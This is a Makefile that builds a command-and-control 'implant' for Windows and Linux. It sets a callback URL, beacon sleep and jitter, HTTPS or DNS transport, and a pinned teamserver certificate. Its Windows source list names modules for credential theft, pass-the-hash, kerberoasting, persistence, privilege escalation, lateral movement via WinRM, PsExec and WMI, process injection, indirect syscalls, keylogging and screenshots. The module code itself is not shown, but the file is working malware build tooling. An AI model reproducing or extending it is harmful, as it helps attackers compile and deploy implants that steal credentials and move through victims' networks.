# C implant — dual platform
#   make                 → Windows PE (mingw)  build/implant_c.exe
#   make OS=linux        → Linux amd64          build/implant_c_linux
#
# HTTPS pin: base64-encoded DER of teamserver CA.
# Prefer CA_CERT_PATH=/path/to/ca-cert.pem (auto PEM→DER→b64).
# Advanced: CA_CERT_PEM=<base64 DER> overrides path conversion.

OS           ?= windows
BUILD_DIR     = ../build

# Prefer openssl/python over xxd (often missing on minimal hosts).
IMPLANT_ID     ?= $(shell openssl rand -hex 16 2>/dev/null || python3 -c 'import secrets;print(secrets.token_hex(16))')
IMPLANT_SECRET ?= $(shell openssl rand -hex 32 2>/dev/null || python3 -c 'import secrets;print(secrets.token_hex(32))')
CALLBACK_URL   ?= https://127.0.0.1:443
SLEEP_MS       ?= 5000
JITTER_PCT     ?= 20
CA_CERT_PATH   ?=
# If CA_CERT_PEM unset and CA_CERT_PATH set: PEM → DER → base64.
CA_CERT_PEM    ?= $(if $(CA_CERT_PATH),$(shell openssl x509 -in "$(CA_CERT_PATH)" -outform DER 2>/dev/null | base64 -w0 2>/dev/null || openssl x509 -in "$(CA_CERT_PATH)" -outform DER 2>/dev/null | base64),)
TRANSPORT_TYPE ?= https
DNS_DOMAIN     ?=
DNS_SERVER     ?=
CDN_DOMAIN     ?=

# Fail closed: empty identity breaks register HMAC (only when building implant).
# Host unit tests do not need ID/secret/CA.
NEED_IDENTITY := $(filter all linux windows config $(OUT),$(MAKECMDGOALS))
ifeq ($(MAKECMDGOALS),)
NEED_IDENTITY := yes
endif
ifneq ($(NEED_IDENTITY),)
ifeq ($(strip $(IMPLANT_ID)),)
$(error IMPLANT_ID is empty — install openssl or python3, or pass IMPLANT_ID=...)
endif
ifeq ($(strip $(IMPLANT_SECRET)),)
$(error IMPLANT_SECRET is empty — install openssl or python3, or pass IMPLANT_SECRET=...)
endif
# HTTPS without pin silently fails TLS; refuse the build.
ifeq ($(TRANSPORT_TYPE),https)
ifeq ($(strip $(CA_CERT_PEM)),)
$(error CA_CERT_PEM empty for HTTPS — pass CA_CERT_PATH=/path/to/ca-cert.pem or CA_CERT_PEM=<base64 DER>)
endif
endif
endif

COMMON_SRCS = \
	src/core/buffer.c \
	src/core/beacon.c \
	src/pb/wire.c \
	src/pb/c2.c \
	src/pb/c2_tasks.c \
	src/pb/c2_modules.c \
	src/tasks/pathjail.c \
	src/tasks/executor.c \
	src/tasks/stubs.c \
	src/transport/transport.c

ifeq ($(OS),linux)
CC       = gcc
OUT      = $(BUILD_DIR)/implant_c_linux
CFLAGS   = -Wall -Wextra -O2 -std=c11 -Iinclude -D_GNU_SOURCE
LDFLAGS  = -lcurl -lssl -lcrypto -lpthread
SRCS = $(COMMON_SRCS) \
	src/platform/platform_linux.c \
	src/crypto/crypto_linux.c \
	src/transport/https_linux.c \
	src/transport/dns_linux.c \
	src/transport/dns_chunk.c \
	src/tasks/shell_linux.c \
	src/tasks/file_linux.c \
	src/tasks/process_linux.c \
	src/tasks/network_linux.c \
	src/tasks/tasks_linux_stub.c \
	src/modules/modules_linux.c \
	linux/main.c
else
CC       = x86_64-w64-mingw32-gcc
OUT      = $(BUILD_DIR)/implant_c.exe
CFLAGS   = -Wall -Wextra -O2 -std=c11 -Iinclude -D_WIN32_WINNT=0x0601
LDFLAGS  = -lwinhttp -lcrypt32 -lbcrypt -lws2_32 -lgdi32 -liphlpapi -lwldap32 -lshell32 -ladvapi32 -lwsmsvc -lmpr -lole32 -loleaut32 -lwbemuuid -luuid -static
SRCS = $(COMMON_SRCS) \
	src/platform/platform_win.c \
	src/syscall/indirect.c \
	src/crypto/crypto.c \
	src/krb5/der.c \
	src/krb5/crypto_rc4.c \
	src/krb5/crypto_aes.c \
	src/krb5/client.c \
	src/modules/mod_util.c \
	src/modules/registry.c \
	src/modules/mod_shell.c \
	src/modules/mod_creds.c \
	src/modules/mod_cloud.c \
	src/modules/mod_persist.c \
	src/modules/mod_privesc.c \
	src/modules/ntlm_parse.c \
	src/modules/ntlm_pth.c \
	src/modules/lateral_winrm.c \
	src/modules/lateral_psexec.c \
	src/modules/lateral_wmi_dcom.c \
	src/modules/mod_lateral.c \
	src/modules/mod_ldap.c \
	src/modules/mod_kerberos.c \
	src/transport/https.c \
	src/transport/dns.c \
	src/transport/dns_chunk.c \
	src/tasks/shell.c \
	src/tasks/file.c \
	src/tasks/process.c \
	src/tasks/network.c \
	src/tasks/inject.c \
	src/tasks/screenshot.c \
	src/tasks/keylog.c \
	src/tasks/socks.c \
	src/tasks/peload.c \
	windows/main.c
endif

.PHONY: all config clean test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse test-host linux windows

all: config $(OUT)

linux:
	$(MAKE) OS=linux all

windows:
	$(MAKE) OS=windows all

# Host-side unit tests for pure logic (no mingw required).
test-pathjail:
	@mkdir -p $(BUILD_DIR)
	cc -std=c11 -Wall -Wextra -Iinclude -DEREBUS_PATHJAIL_HOST_TEST \
		tests/pathjail_host_test.c src/tasks/pathjail.c -o $(BUILD_DIR)/pathjail_host_test
	$(BUILD_DIR)/pathjail_host_test

test-pb-copy:
	@mkdir -p $(BUILD_DIR)
	cc -std=c11 -Wall -Wextra -Iinclude \
		tests/pb_copy_host_test.c src/pb/wire.c -o $(BUILD_DIR)/pb_copy_host_test
	$(BUILD_DIR)/pb_copy_host_test

test-kerberoast-pb:
	@mkdir -p $(BUILD_DIR)
	cc -std=c11 -Wall -Wextra -Iinclude \
		tests/kerberoast_pb_host_test.c src/pb/wire.c src/pb/c2_modules.c \
		-o $(BUILD_DIR)/kerberoast_pb_host_test
	$(BUILD_DIR)/kerberoast_pb_host_test

test-ntlm-parse:
	@mkdir -p $(BUILD_DIR)
	cc -std=c11 -Wall -Wextra -Iinclude \
		tests/ntlm_parse_host_test.c src/modules/ntlm_parse.c \
		-o $(BUILD_DIR)/ntlm_parse_host_test
	$(BUILD_DIR)/ntlm_parse_host_test

test-host: test-pathjail test-pb-copy test-kerberoast-pb test-ntlm-parse

config:
	@chmod +x scripts/gen_config.sh
	IMPLANT_ID="$(IMPLANT_ID)" \
	IMPLANT_SECRET="$(IMPLANT_SECRET)" \
	CALLBACK_URL="$(CALLBACK_URL)" \
	SLEEP_MS="$(SLEEP_MS)" \
	JITTER_PCT="$(JITTER_PCT)" \
	CA_CERT_PEM="$(CA_CERT_PEM)" \
	TRANSPORT_TYPE="$(TRANSPORT_TYPE)" \
	DNS_DOMAIN="$(DNS_DOMAIN)" \
	DNS_SERVER="$(DNS_SERVER)" \
	CDN_DOMAIN="$(CDN_DOMAIN)" \
	./scripts/gen_config.sh include/erebus/config.h

$(OUT): config $(SRCS)
	@mkdir -p $(BUILD_DIR)
	$(CC) $(CFLAGS) $(SRCS) -o $(OUT) $(LDFLAGS)

clean:
	rm -f include/erebus/config.h $(BUILD_DIR)/implant_c.exe $(BUILD_DIR)/implant_c_linux
